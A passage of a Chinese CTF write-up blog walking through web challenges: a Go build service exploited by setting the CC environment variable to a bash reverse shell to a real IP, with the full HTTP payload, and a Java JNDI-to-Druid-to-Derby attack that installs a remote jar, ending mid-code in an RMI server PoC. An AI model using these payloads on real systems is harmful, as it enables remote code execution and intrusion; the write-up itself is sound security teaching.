src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707072346601-087d28ef-5a5a-493e-83b8-816469502d4e.png#averageHue=%23363532&clientId=ua5ca646f-42d6-4&from=paste&height=102&id=ub929f355&originHeight=127&originWidth=1120&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30202&status=done&style=none&taskId=u998ce98b-5fbb-477d-86a6-f8324dcc1e7&title=&width=896" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707072322704-3622867c-6a21-4935-8ec7-5e095828b8fc.png#averageHue=%23010100&clientId=ua5ca646f-42d6-4&from=paste&height=268&id=u47d1ac55&originHeight=335&originWidth=1153&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31596&status=done&style=none&taskId=u40cc06cc-0cbe-49f0-a05e-32e42cd7d3b&title=&width=922.4" alt="image.png"><br>最后输入全局后门alive获取flag即可。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707072342356-045e0f9f-2f15-4ecb-89e1-ca1804cd4418.png#averageHue=%23353a3c&clientId=ua5ca646f-42d6-4&from=paste&height=634&id=ud68d2550&originHeight=792&originWidth=1483&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1445865&status=done&style=none&taskId=ue834ae6f-17c6-4e90-b5c5-143f6a97957&title=&width=1186.4" alt="image.png"></p>
<h1 id="MyGo"><a href="#MyGo" class="headerlink" title="MyGo"></a>MyGo</h1><p>MyGO！<br>给了源码分析一下。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;embed&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed public/*</span></span><br><span class="line"><span class="keyword">var</span> fs embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IndexHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	c.FileFromFS(<span class="string">&quot;public/&quot;</span>, http.FS(fs))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BuildHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> req <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;req); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> !PathExists(<span class="string">&quot;/tmp/build/&quot;</span>) &#123;</span><br><span class="line">		os.Mkdir(<span class="string">&quot;/tmp/build/&quot;</span>, <span class="number">0755</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">defer</span> os.Remove(<span class="string">&quot;/tmp/build/main.go&quot;</span>)</span><br><span class="line">	<span class="keyword">defer</span> os.Remove(<span class="string">&quot;/tmp/build/main&quot;</span>)</span><br><span class="line"></span><br><span class="line">	os.Chdir(<span class="string">&quot;/tmp/build/&quot;</span>)</span><br><span class="line">	os.WriteFile(<span class="string">&quot;main.go&quot;</span>, []<span class="type">byte</span>(req[<span class="string">&quot;code&quot;</span>].(<span class="type">string</span>)), <span class="number">0644</span>)</span><br><span class="line">	<span class="keyword">var</span> env []<span class="type">string</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> req[<span class="string">&quot;env&quot;</span>].(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">		env = <span class="built_in">append</span>(env, fmt.Sprintf(<span class="string">&quot;%s=%s&quot;</span>, k, v))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;go&quot;</span>, <span class="string">&quot;build&quot;</span>, <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;main.go&quot;</span>)</span><br><span class="line">	cmd.Env = <span class="built_in">append</span>(os.Environ(), env...)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Build error&quot;</span>&#125;)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.File(<span class="string">&quot;/tmp/build/main&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PathExists</span><span class="params">(p <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	_, err := os.Stat(p)</span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> os.IsNotExist(err) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, IndexHandler)</span><br><span class="line">	r.POST(<span class="string">&quot;/build&quot;</span>, BuildHandler)</span><br><span class="line">	r.Run(<span class="string">&quot;:8000&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>作用就是一个编译平台，你输入一个code，他就会帮你build，在这个过程中我们可控的东西只有environment变量，那么我们科学上网的时间就到了。<br><a target="_blank" rel="noopener" href="https://pkg.go.dev/cmd/go#hdr-Environment_variables">https://pkg.go.dev/cmd/go#hdr-Environment_variables</a><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707072728333-508b6e63-d223-4dfd-ab8b-b0cf432ea31e.png#averageHue=%23f8f7f6&clientId=ua5ca646f-42d6-4&from=paste&height=684&id=ud8ab931c&originHeight=855&originWidth=1330&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80443&status=done&style=none&taskId=udc3b3ff5-701b-4ea4-b326-de31305587d&title=&width=1064" alt="image.png"><br>我找到了个好玩的变量，那就是<code>CC</code>，这个东西是一个指令，我们可以看看本地<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707072790187-8b2fd15e-3ee4-46c4-b2ef-d4a9bd6f2975.png#averageHue=%23010000&clientId=ua5ca646f-42d6-4&from=paste&height=275&id=ubf52a3ba&originHeight=344&originWidth=1326&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23752&status=done&style=none&taskId=u188202cc-58db-4424-8add-7197bdb7e96&title=&width=1060.8" alt="image.png"><br>可以发现CC&#x3D;gcc，这段代码触发的场合如下</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef int (*intFunc) ();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// int</span></span><br><span class="line"><span class="comment">// bridge_int_func(intFunc f)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//		return f();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// int fortytwo()</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//	    return 42;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	f := C.intFunc(C.fortytwo)</span><br><span class="line">	fmt.Println(<span class="type">int</span>(C.bridge_int_func(f)))</span><br><span class="line">	<span class="comment">// Output: 42</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注释中的C代码会被gcc进行编译。我们可以这样测试<code>export CC=whoami</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707072893821-ec74cacd-07de-446b-908e-439488d90cf8.png#averageHue=%23020101&clientId=ua5ca646f-42d6-4&from=paste&height=80&id=u61eaaef3&originHeight=100&originWidth=297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3246&status=done&style=none&taskId=u76db5e89-2838-4f15-b7a4-95292c39d17&title=&width=237.6" alt="image.png"><br>你将会看到一段抛错<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707072928736-44d5560b-a113-43ae-8e1c-bc61ed48476c.png#averageHue=%23030201&clientId=ua5ca646f-42d6-4&from=paste&height=126&id=u078946c3&originHeight=157&originWidth=643&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9533&status=done&style=none&taskId=u1431561b-e767-4500-b911-6ee2aeea43b&title=&width=514.4" alt="image.png"><br>那就是gcc被我们改成了whoami，自然就报错了，我们这里就是一个命令注入的点位了。<br>我们<code>export CC=&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.130.24.188/7775 &lt;&amp;1&quot;&#39;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707073003766-1b4e45d2-cf43-4804-b588-ed5560e9f068.png#averageHue=%23020101&clientId=ua5ca646f-42d6-4&from=paste&height=111&id=u46e6f4ca&originHeight=139&originWidth=1082&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11299&status=done&style=none&taskId=ua105d087-1156-40e0-bba0-cd7f1bdad16&title=&width=865.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707072998421-862ffeeb-3acc-4fd4-823e-7e9b71de618d.png#averageHue=%232f2e2d&clientId=ua5ca646f-42d6-4&from=paste&height=800&id=u2e3ca912&originHeight=1000&originWidth=1795&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=171269&status=done&style=none&taskId=u9aa12426-f64e-48b0-a106-18edc3ae819&title=&width=1436" alt="image.png"><br>即可完成注入获取flag。最终payload数据包如下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/build</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>121.199.64.23:25480</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>443</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain;charset=UTF-8</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://121.199.64.23:25480</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://121.199.64.23:25480/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;env&quot;</span>:&#123;<span class="string">&quot;GOOS&quot;</span>:<span class="string">&quot;linux&quot;</span>,<span class="string">&quot;GOARCH&quot;</span>:<span class="string">&quot;amd64&quot;</span>,<span class="string">&quot;CGO_ENABLED&quot;</span>:<span class="string">&quot;1&quot;</span>,</span></span><br><span class="line"><span class="language-swift"><span class="string">&quot;CC&quot;</span>:<span class="string">&quot;bash -c <span class="subst">\&quot;</span>bash -i &gt;&amp; /dev/tcp/8.130.24.188/7775 &lt;&amp;1<span class="subst">\&quot;</span>&quot;</span>,</span></span><br><span class="line"><span class="language-swift"><span class="string">&quot;GOGCCFLAGS&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="string">&quot;code&quot;</span>:<span class="string">&quot;package main<span class="subst">\n</span><span class="subst">\n</span>// #include &lt;stdio.h&gt;<span class="subst">\n</span>// #include &lt;stdlib.h&gt;<span class="subst">\n</span>//<span class="subst">\n</span>// static void myprint(char* s) &#123;<span class="subst">\n</span>//   printf(<span class="subst">\&quot;</span>%s<span class="subst">\\</span>n<span class="subst">\&quot;</span>, s);<span class="subst">\n</span>// &#125;<span class="subst">\n</span>import <span class="subst">\&quot;</span>C<span class="subst">\&quot;</span><span class="subst">\n</span>import <span class="subst">\&quot;</span>unsafe<span class="subst">\&quot;</span><span class="subst">\n</span><span class="subst">\n</span>func main() &#123;<span class="subst">\n</span>        cs := C.CString(<span class="subst">\&quot;</span>Hello from stdio<span class="subst">\&quot;</span>)<span class="subst">\n</span>        C.myprint(cs)<span class="subst">\n</span>        C.free(unsafe.Pointer(cs))<span class="subst">\n</span>&#125;&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>


<h1 id="Derby"><a href="#Derby" class="headerlink" title="Derby"></a>Derby</h1><p>Derby + Druid 高版本 JNDI JDBC Attack<br>又到了Java Time，当时晚上写这题的时候还踩了点坑，主要就是JDK17那个大坑，我就是不信邪，我就是想用Derby的readObject去打Jackson链，但其实现在想想一点都不可能，因为JDK限制了module</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.derby;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello derby&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/lookup&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ctx.lookup(url);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>很干脆的一个JNDI入口点lookup。但JDK17，在这个环境下还是需要利用一些额外的类去绕过，在Tomcat某些版本是可以BeanFactory配合EL去实现命令执行的，这里是Druid，也可以绕过。<br><code>DruidDataSourceFactory#getObjectInstance</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp; obj <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference)obj;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&quot;javax.sql.DataSource&quot;</span>.equals(ref.getClassName()) &amp;&amp; !<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>.equals(ref.getClassName())) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ALL_PROPERTIES.length; ++i) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">propertyName</span> <span class="operator">=</span> ALL_PROPERTIES[i];</span><br><span class="line">                    <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(propertyName);</span><br><span class="line">                    <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">propertyValue</span> <span class="operator">=</span> ra.getContent().toString();</span><br><span class="line">                        properties.setProperty(propertyName, propertyValue);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.createDataSourceInternal(properties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在这里有一个<code>createDataSourceInternal</code>操作<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707116553623-4c0c7995-9e49-4d8f-b209-598063814c1d.png#averageHue=%23292e37&clientId=u3ebc7ad1-22f1-4&from=paste&height=154&id=u1cd85024&originHeight=192&originWidth=1185&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31492&status=done&style=none&taskId=u68657399-8989-486b-9482-7e0390d135a&title=&width=948" alt="image.png"><br>在这个config方法最后会调用init方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707116569700-1c910049-c18d-4508-a6f5-bf399e9c2c92.png#averageHue=%23282d35&clientId=u3ebc7ad1-22f1-4&from=paste&height=139&id=ue25d5894&originHeight=174&originWidth=854&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18656&status=done&style=none&taskId=uc37c0c66-b5bb-42d0-905a-df15a390984&title=&width=683.2" alt="image.png"><br>在这里会有createPhysicalConnection方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707117661063-544149e1-0fbb-4a6a-a51c-672c48ff8c91.png#averageHue=%232a2f39&clientId=u3ebc7ad1-22f1-4&from=paste&height=202&id=u17d5e421&originHeight=253&originWidth=1161&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55104&status=done&style=none&taskId=u2c97ee6f-3d9d-4f94-aae8-80eec23df10&title=&width=928.8" alt="image.png"><br>最终在里面发起了JDBC连接。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707117712723-b0175836-8b04-44a4-b754-f75a07a00816.png#averageHue=%23292d36&clientId=u3ebc7ad1-22f1-4&from=paste&height=348&id=u96f93068&originHeight=435&originWidth=1097&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66013&status=done&style=none&taskId=uc88fdc4e-f9fb-47d4-a048-d1c3e7ce91b&title=&width=877.6" alt="image.png"><br>这时候就回到了JDBC-ATTACK的利用了<br><a href="https://boogipop.com/2023/10/01/JDBC-Attack%20%E5%88%A9%E7%94%A8%E6%B1%87%E6%80%BB/">JDBC-Attack 利用汇总 - Boogiepop Doesn’t Laugh</a><br>假如在这里有h2数据库的driver那就可以直接RCE，但很遗憾是没有的并且题目提示打derby。我一开始去想到的是derby的readobject，但实际上并不是，这里需要自己寻找一下。回到config方法，你会发现有一些初始化操作<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707117852412-ae98efbc-b135-49be-9294-d449d06a4a56.png#averageHue=%23292d36&clientId=u3ebc7ad1-22f1-4&from=paste&height=417&id=ubea69c59&originHeight=521&originWidth=1302&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=87825&status=done&style=none&taskId=u1d126b73-2f87-457e-a20b-aa79e79deb9&title=&width=1041.6" alt="image.png"><br>而这里我们效仿h2，也寻找是否有初始化的sql语句，到这里就转变为了sql可控的注入。而derby数据库也是可以加载Jar包的<br><a target="_blank" rel="noopener" href="http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce">http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">## 导入一个类到数据库中</span><br><span class="line">CALL SQLJ.INSTALL_JAR(<span class="string">&#x27;http://127.0.0.1:8088/test3.jar&#x27;</span>, <span class="string">&#x27;APP.Sample4&#x27;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">## 将这个类加入到derby.database.classpath，这个属性是动态的，不需要重启数据库</span><br><span class="line">CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(<span class="string">&#x27;derby.database.classpath&#x27;</span>,<span class="string">&#x27;APP.Sample4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">## 创建一个PROCEDURE，EXTERNAL NAME 后面的值可以调用类的<span class="keyword">static</span>类型方法</span><br><span class="line">CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME <span class="string">&#x27;testShell4.exec&#x27;</span></span><br><span class="line"></span><br><span class="line">## 调用PROCEDURE</span><br><span class="line">CALL SALES.TOTAL_REVENUES()</span><br></pre></td></tr></table></figure>
<p>那么最终poc就如下了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.pocs.solutions.n1junior;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DerbyEvilServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//Registry registry = LocateRegistry.getRegistry(8883);</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">8883</span>);</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>,<span class="string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:derby:dbname;create=true&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">JDBC_USER</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">JDBC_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line">            